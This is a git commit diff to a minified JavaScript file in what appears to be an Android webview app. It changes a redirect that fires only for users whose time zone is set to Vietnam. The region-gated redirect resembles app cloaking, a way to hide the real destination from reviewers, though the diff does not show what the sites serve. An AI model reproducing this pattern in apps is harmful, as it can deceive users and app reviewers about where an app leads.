d5f6af0c080da5b2203de591e432e86dc21d691d
hai07t <hai07t@gmail.com>
2025-12-29 22:58:07 +0700

    Update min.js

--- min.js
+++ min.js
@@ -4,7 +4,7 @@ if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
   if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
     AndroidOrientation.lockLandscape();
   }
-  var to = "https://webviewvin.xyz/";
+  var to = "https://www.appicon.co/";
   window.location.href = to;
 } else {
   if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
